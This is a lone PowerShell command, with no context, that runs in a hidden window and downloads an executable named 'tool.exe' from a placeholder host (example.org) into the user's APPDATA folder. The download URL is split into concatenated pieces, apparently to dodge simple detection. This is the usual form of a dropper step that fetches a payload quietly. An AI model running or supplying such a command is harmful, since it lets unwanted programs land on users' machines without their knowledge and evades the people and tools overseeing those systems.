powershell -WindowStyle Hidden -Command Invoke-RestMethod -Uri "https://downloads."+"example.org/tool.exe" -OutFile "$env:APPDATA\tool.exe"
